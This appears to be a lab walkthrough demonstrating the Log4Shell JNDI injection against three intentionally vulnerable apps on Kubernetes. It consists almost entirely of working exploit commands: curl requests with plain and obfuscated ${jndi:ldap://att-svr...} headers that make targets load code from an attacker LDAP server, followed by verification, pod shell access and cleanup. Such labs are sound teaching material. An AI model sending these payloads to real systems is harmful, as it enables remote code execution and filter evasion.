## Encode with base64 your command

```console
echo "touch /tmp/youHaveBeenPwned" | base64 -w0
dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==
```

## Execute the attack without obfuscation

```console
curl $(kubectl get svc vul-app-1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app-2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app-3-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
```

## Execute the attack with obfuscation

```console
curl $(kubectl get svc vul-app-1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app-2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
curl $(kubectl get svc vul-app-3-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
```

## Confirm that the code execution was successful

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-1) -- ls -l /tmp
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-2) -- ls -l /tmp
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-3) -- ls -l /tmp
```

## Connect to runnint pod

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-1) -- sh
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-2) -- sh
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-3) -- sh
```

## Delete file inside the container

```console
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-1) -- rm -f /tmp/youHaveBeenPwned
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-2) -- rm -f /tmp/youHaveBeenPwned
kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app-3) -- rm -f /tmp/youHaveBeenPwned
```